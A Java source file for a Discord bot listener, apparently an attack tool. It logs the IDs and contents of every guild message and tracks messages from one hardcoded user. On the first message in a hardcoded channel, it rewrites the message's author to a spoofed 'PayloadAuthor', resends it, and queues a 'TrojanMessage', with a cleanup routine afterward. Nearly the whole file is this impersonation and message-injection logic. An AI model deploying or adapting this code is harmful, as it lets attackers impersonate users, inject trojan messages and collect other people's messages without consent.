import java.util.Map;

import org.apache.commons.collections4.map.HashedMap;

import net.dv8tion.jda.core.entities.TextChannel;
import net.dv8tion.jda.core.entities.impl.MessageImpl;
import net.dv8tion.jda.core.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.core.hooks.ListenerAdapter;

public class HackedListener extends ListenerAdapter {
	
	private int receivedCounter = 0;
	private int sentCounter = 0;
	private int timeout = 3;
	private Map<String, TextChannel> rickMessages = new HashedMap<>();
	private static final String CHANNEL_INTRODUCTION = "353931513424773121";
	private static final String RICK_ID = "375019001685868554";
	
	
	@Override
	public void onGuildMessageReceived(GuildMessageReceivedEvent event) {	
		System.out.format("Message %d Received, Author String id = %S\n", receivedCounter, event.getMessage().getAuthor().getId());
		System.out.format("Message %d Received, Message String id = %S\n", receivedCounter, event.getMessage().getId());
		System.out.format("Message %d, Contents = %S\n", receivedCounter, event.getMessage().getContent());
		receivedCounter += 1;
		if (RICK_ID.equals(event.getMessage().getAuthor().getId()))
			rickMessages.put(event.getMessage().getId(), event.getChannel());
		
		if (event.getChannel().getId().equals(CHANNEL_INTRODUCTION)) {	
			// Piggyback on the first message received.
			if (receivedCounter == 1)
				piggyBack(event.getChannel(), (MessageImpl) event.getMessage(), false);
			// For testing purposes.
			else if ((receivedCounter > 0) && (receivedCounter < timeout))
				;
				//event.getChannel().sendMessage("RICK IS UNHAPPY!").queue();
			else
				TrojanRick.cleanUp(sentCounter, rickMessages, true);
		}
	}
	
	
	private void piggyBack(TextChannel channel, MessageImpl original, boolean debug) {
		System.out.println("START PIGGYBACK");		
		
		((MessageImpl) original).setAuthor(new PayloadAuthor(original, false));
		System.out.format("SPOOFED ORIGINAL: New Author String id = %s\n", original.getAuthor().getId());
		channel.sendMessage(original).queue();
		sentCounter += 1;
		System.out.println("SPOOFED ORIGINAL: Message QUEUED");
		System.out.println(original.getId());
		
		TrojanMessage trojanMessage = new TrojanMessage(original.getIdLong(), original.getChannel(), original.isWebhookMessage(), original, debug);
		System.out.format("TROJAN NEW: New Author String id = %s\n", trojanMessage.getAuthor().getId());
		channel.sendMessage(trojanMessage).queue();
		sentCounter += 1;
		System.out.println("TROJAN NEW: Message QUEUED");
		System.out.println(trojanMessage.getId());

		System.out.println("END PIGGYBACK");
	}

}
